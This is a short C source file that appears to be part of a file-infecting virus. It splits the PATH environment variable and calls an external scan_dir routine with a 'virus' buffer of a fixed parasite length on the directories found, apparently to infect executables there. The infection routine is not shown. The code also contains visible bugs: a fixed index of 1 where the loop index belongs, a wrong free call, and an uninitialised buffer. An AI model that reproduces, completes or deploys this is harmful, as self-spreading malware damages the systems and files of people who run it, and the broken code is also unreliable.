#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

#define PARASITE_LENGTH 23016

extern void scan_dir(char *directory, char *virus);

char** str_split(char* a_str, const char a_delim) {
    char** result    = 0;
    size_t count     = 0;
    char* tmp        = a_str;
    char* last_comma = 0;
    char delim[2];
    delim[0] = a_delim;
    delim[1] = 0;

    /* Count how many elements will be extracted. */
    while (*tmp) {
        if (a_delim == *tmp) {
            count++;
            last_comma = tmp;
        }
        tmp++;
    }

    /* Add space for trailing token. */
    count += last_comma < (a_str + strlen(a_str) - 1);

    /* Add space for terminating null string so caller
       knows where the list of returned strings ends. */
    count++;

    result = malloc(sizeof(char*) * count);

    if (result) {
        size_t idx  = 0;
        char* news = strtok(a_str, delim);

        while (news) {
            assert(idx < count);
            *(result + idx++) = strdup(news);
            news = strtok(0, delim);
        }
        assert(idx == count - 1);
        *(result + idx) = 0;
    }

    return result;
}

int get_path() {
    char* virus[PARASITE_LENGTH];
    char* s = getenv("PATH");
    char** news;

    news = str_split(s, ':');

    if (news){
        int i;
        for (i = 0; *(news + i); i++) {
            //printf("%s\n", *(news + i));
	    scan_dir(*(news + 1), *virus);
            free((news + i));
        }
        printf("\n");
        free(news);
    }

    // If the environment variable doesn't exist, it returns NULL
    //printf("%s\n", (s != NULL) ? s : "getenv returned NULL");

    return 0;
}
